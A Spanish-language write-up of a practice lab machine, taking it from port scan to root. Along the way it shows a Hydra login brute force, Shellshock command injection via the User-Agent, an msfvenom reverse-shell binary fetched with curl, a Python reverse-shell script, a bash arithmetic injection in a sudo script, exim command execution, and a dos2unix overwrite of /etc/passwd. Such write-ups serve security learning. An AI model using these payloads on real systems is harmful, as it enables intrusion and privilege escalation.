# Enumeracion de Puertos, Servicios y Versiones

```
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN nmap
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-02 13:55 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds

```
por lo visto solo contiene el puerto 80 abierto, asi que chequeo el servicio web y me consigo con un panel de login


![Screenshot From 2024-11-02 13-59-25](https://github.com/user-attachments/assets/83630253-c7ec-4a2b-bed1-aab9d1b051a5)

chequeo el codigo fuente pero no consigo nada, intento con credenciales por defecto como root:root o admin:admin pero sin resultados asi que aplico fuzzing web a ver que mas puedo conseguir

# FUzzing Web

```
feroxbuster -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,log -t 200 -d 10 --random-agent
```

no me arroja resultados pero inspeccionando la web, veo que posee cookies

![Screenshot From 2024-11-02 14-10-26](https://github.com/user-attachments/assets/5a21e3cf-cb30-4493-97b9-ee397ef6cf7b)

asi que se las paso a feroxbuster

```
feroxbuster -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,log -t 200 -d 10 --random-agent -H 'cookie: PHPSESSID=t2d0hebr4qjb42n2fc5daam94d'
```
```
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.17.0.2/
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🤯  Header                │ cookie: PHPSESSID=t2d0hebr4qjb42n2fc5daam94d
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, log]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 10
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       68l      138w     1839c http://172.17.0.2/index.php
200      GET       68l      138w     1839c http://172.17.0.2/

```

solo consigo un index.php que tras chequear es el mismo panel de login y revisando el codigo fuente no obserno nada que me pueda servir, asi que me tocara ir aplicando fuerza bruta
con hydra y usuarios como root, administrator o admin a ver si logro algo

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form "/index.php:username=^USER^&password=^PASS^:H=Cookie: PHPSESSID=t2d0hebr4qjb42n2fc5daam94d:F=Credenciales incorrectas."
```

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-02 14:16:23
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344403 login tries (l:1/p:14344403), ~896526 tries per task
[DATA] attacking http-post-form://172.17.0.2:80/index.php:username=^USER^&password=^PASS^:H=Cookie: PHPSESSID=t2d0hebr4qjb42n2fc5daam94d:F=Credenciales incorrectas.
[80][http-post-form] host: 172.17.0.2   login: admin   password: christelle
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-02 14:16:25
```
y doy con credenciales validas para el panel de login y tras acceder me consigo con nuevo panel pero esta vez para acceder al servicio de correo de gmail


![Screenshot From 2024-11-02 14-20-20](https://github.com/user-attachments/assets/48e2dbe5-fd61-45b4-88b7-365a1dc21720)

revisando la web no consigo nada de interes sino tan solo observo el mensaje arriba del panel que indica que el user-agent fue almacenado en el log, lo que me da entender que
se esta manejando la variable user-agent de algun modo para llevar un registro de estos en un archivo de log...
Por lo que intentare ver si es posible que el servicio web sea vulnerable a shellshock, que es una vulnerabilidad que sea explota con regualaridad a traves del user-agent o 
algun otro encabezado, asi que capturo una peticion con burpsuite y la envio al repeter para hacer pruebas


![Screenshot From 2024-11-02 14-28-25](https://github.com/user-attachments/assets/07892252-d5f9-488b-ac1f-7093ad5aed1d)

ahora modifico el user-agent para probar si es vulnerable a shellshock con el siguiente payload: () { :; }; [comando]

![Screenshot From 2024-11-02 14-34-29](https://github.com/user-attachments/assets/6da4f7dc-0fb2-4bca-b488-6eb1b8289f29)

aqui el [comando] que aplico es para escribir sobre el index.php del panel de login a ver si resulta ser vulnerable y en efecto lo es, ya que si voy al navegador 
y recargo la web, debajo del panel de login puedo observar que en efecto se ejecuto el comando que envie por el user-agent

![Screenshot From 2024-11-02 14-39-07](https://github.com/user-attachments/assets/56368b0f-5836-4b82-b40f-6af94d20a147)


sabiendo esto, puedo ahora enviarme una revershell asi que me coloco en escucha con netcat

```
nc -lnvp 4444
Listening on 0.0.0.0 4444
```
y envio la revershell por el user-agent

![Screenshot From 2024-11-02 14-42-56](https://github.com/user-attachments/assets/cb6e0989-5223-41a1-bab2-a80635e0663d)


y obtengo la conexion pero por alguna razon despues de un par de segundos me saca del sistema

![Screenshot From 2024-11-02 14-44-27](https://github.com/user-attachments/assets/c5732ab2-3568-4b89-8130-0f6a03da0da9)

despues de un rato intentando mantener la conexion se me ocurrio probar hacer uso de un binario de msfvenom para establecer la conexion, pero primero pruebo si el server
tiene instalado ya sea wget o curl para que descargue el binario y para esto primero me levanto un server python en mi maquina

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
luego envio una solicitud con curl o wget, pero veo que solo con curl obtengo resultados

![Screenshot From 2024-11-02 14-55-41](https://github.com/user-attachments/assets/bde97546-2fdb-468e-b18d-348618e85b66)

aqui puedo ver que funciona curl en el servidor

![Screenshot From 2024-11-02 14-57-11](https://github.com/user-attachments/assets/6a46d942-f5a1-4b11-8350-46a719d0ec2d)


ya que se cual esta instalado, me creo el binario de msfvenom

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f elf -o reverse.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: reverse.elf
```

y creado el binario procedo a descargarlo al servidor

![Screenshot From 2024-11-02 15-16-04](https://github.com/user-attachments/assets/4d143ffd-9c7e-47f8-a3e6-080e5b46769d)


y confirmo la descarga observando en server python donde se refleja la solicitud de descarga que he enviado

![Screenshot From 2024-11-02 15-06-19](https://github.com/user-attachments/assets/534ff02d-b7b6-455f-85da-1c832c4f8ce1)

ahora estando en escucha por netcat, envio un comando al server a traves del user-agent que le de permisos de ejecucion al binario descargado

![Screenshot From 2024-11-02 15-17-30](https://github.com/user-attachments/assets/8533f62b-dbb0-4590-b2f8-d337417c67b1)

ahora envio el comando para ejecutar el binario

![Screenshot From 2024-11-02 15-19-03](https://github.com/user-attachments/assets/b7d72e9c-49b2-4493-9d0d-51db8cef02d5)


y obtengo la conexion, espero un rato y esta vez no me desconecta

![Screenshot From 2024-11-02 15-20-15](https://github.com/user-attachments/assets/85675dd0-2462-46bd-bc58-7246e2ee5d5e)


# Escalada de Privilegios

tratando la terminal
```
export SHELL=bash
export TERM=xterm
script /dev/null -c bash
^Z

stty raw -echo; fg
reset xterm
stty rows 38 columns 168
```
chequeo lo user's del sistema y existen 3

```
cat /etc/passwd |grep bash
root:x:0:0:root:/root:/bin/bash
maci:x:1000:1000::/home/maci:/bin/bash
darksblack:x:1001:1001:,,,:/home/darksblack:/bin/bash
pepe:x:1002:1002:,,,:/home/pepe:/bin/bash

```
de estos 3 user, solo tengo acceso al directorio del user maci el cual en su directorio contiene un script

![Screenshot From 2024-11-02 15-28-17](https://github.com/user-attachments/assets/8f17b669-a2e4-42c0-9e48-aff353cbe7dd)

pero no puedo aprovecharme de el para hacer la escalada asi que sigo buscando en el sistema y consigo lo siguiente:

![Screenshot From 2024-11-02 15-30-33](https://github.com/user-attachments/assets/adf990f5-9fdd-45ff-9ada-a53212eeab88)


que para mi ya es conocida esta cadena, resulta ser la password hasheada del user darksblack que se almacena en el archivo /etc/shadow
asi que creo un archivo que contenga este hash en mi maquina atacante y se la paso a john

![Screenshot From 2024-11-02 15-34-12](https://github.com/user-attachments/assets/b92cf61a-49b3-4158-86cb-e52ebfa7ff38)

y logre conseguir la password del user darksblack asi que puedo cambiar de user

![Screenshot From 2024-11-02 15-36-47](https://github.com/user-attachments/assets/6bbff8b6-158b-44fe-ac64-fe12d1575739)

```
sudo -l
Matching Defaults entries for darksblack on 9c13e159e6ea:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User darksblack may run the following commands on 9c13e159e6ea:
    (maci) NOPASSWD: /home/maci/script.sh
```

ahora como el user darksblack es que puedo hacer uso del script que habia conseguido anteriormente, asi que procedo a la escalada hacia el user maci aprovechandome del 
script

```
sudo -u maci /home/maci/script.sh
Adivina: a[$(/bin/bash -p >&2)]+123123
maci@9c13e159e6ea:~$ whoami
maci
maci@9c13e159e6ea:~$ sudo -l
Matching Defaults entries for maci on 9c13e159e6ea:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User maci may run the following commands on 9c13e159e6ea:
    (pepe) NOPASSWD: /usr/sbin/exim

```
podemos ejecutar el binario exim como el user pepe, en este punto me tomo mucho tiempo de investigacion, prueba y error pero al final consegui respuesta en la propia
documentacion del binario, ya que los exploit que consegui era para una ejecucion remota de comandos los cuales no me servirian...
la informacion la consegui en este enlace: `https://www.exim.org/exim-html-current/doc/html/spec_html/ch-string_expansions.html` 

![Screenshot From 2024-11-02 15-51-58](https://github.com/user-attachments/assets/b9c5787e-169d-41d0-8c7a-6b018872df66)

la verdad tuve que leer mucha documentacion, muchas puebas y errores hasta que logre dar con la ejecucion de comandos

`exim -be '${run{/bin/bash -c "comando"}}'`

aunque fuera sido tan facil como consultarle a la inteligencia artificial y automaticamente me lo da sin haber hecho mucho esfuerzo (pero eso no tiene merito alguno),
pero existe un problema al intentar lanzar una bash como el user pepe

```
maci@9c13e159e6ea:~$ sudo -u pepe /usr/sbin/exim -be '${run{/bin/bash -c "bash -p"}}'

maci@9c13e159e6ea:~$ sudo -u pepe /usr/sbin/exim -be '${run{/bin/bash -c "/bin/bash"}}'
```

no puedo obtener la bash asi como asi, asi que creare un script en python que me envie una revershell

```
nano /tmp/revershell.py
```
```
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.17.0.1", 4445))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
import pty
pty.spawn("/bin/bash")

```
le asigno permisos de ejecucion `chmod +x /tmp/revershell.py`, me coloco en escucha netcat en mi maquina atacante `nc -lnvp 4445` y ejecuto el script como el user
pepe `sudo -u pepe /usr/sbin/exim -be '${run{/bin/bash -c "python3 /tmp/revershell.py"}}'`, chequeo netcaat y he recibido la conexion como el user pepe

tratando la bash
```
export SHELL=bash
export TERM=xterm
script /dev/null -c bash
^Z
stty raw -echo; fg
reset xterm
stty rows 38 columns 168

```

ahora chequeo si puedo ejecutar algun binario como root que es lo que me falta, ser root

```
sudo -l
Matching Defaults entries for pepe on 9c13e159e6ea:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pepe may run the following commands on 9c13e159e6ea:
    (ALL : ALL) NOPASSWD: /usr/bin/dos2unix
```

puedo ejecutar el binario /usr/bin/dos2unix como root, la escalada es simple, primero voy a copiar el contenido del archivo /etc/passwd en un archivo en mi directorio

```
pepe@9c13e159e6ea:/home/pepe$ cat /etc/passwd > escalada
pepe@9c13e159e6ea:/home/pepe$ cat escalada
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
maci:x:1000:1000::/home/maci:/bin/bash
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
darksblack:x:1001:1001:,,,:/home/darksblack:/bin/bash
pepe:x:1002:1002:,,,:/home/pepe:/bin/bash
Debian-exim:x:101:104::/var/spool/exim4:/usr/sbin/nologin
pepe@9c13e159e6ea:/home/pepe$ 

```
ahora edito el archivo 'escalada' eliminando solo la 'x' que contiene la linea de root quedando: `root::0:0:root:/root:/bin/bash`
por lo que ahora ya teniendo modificado el archivo 'escalada' procedo usar el binario '/usr/bin/dos2unix' como root para modificar el archivo '/etc/passwd'

```
sudo /usr/bin/dos2unix -f -n escalada /etc/passwd
dos2unix: converting file escalada to file /etc/passwd in Unix format...
```
`su root`

![Screenshot From 2024-11-02 16-33-40](https://github.com/user-attachments/assets/8645136d-cd2b-457a-90bb-41a99eca4655)

si me voy al directorio de root puedo observar 3 archivos; 2 script en bash y un archivo de log, chequeando los script entendi por que? me desconectaba al intentar
lanzar la primera revershell y por que me costo realizar el tratamiento de la bash antes de dar con la forma de evadir el script

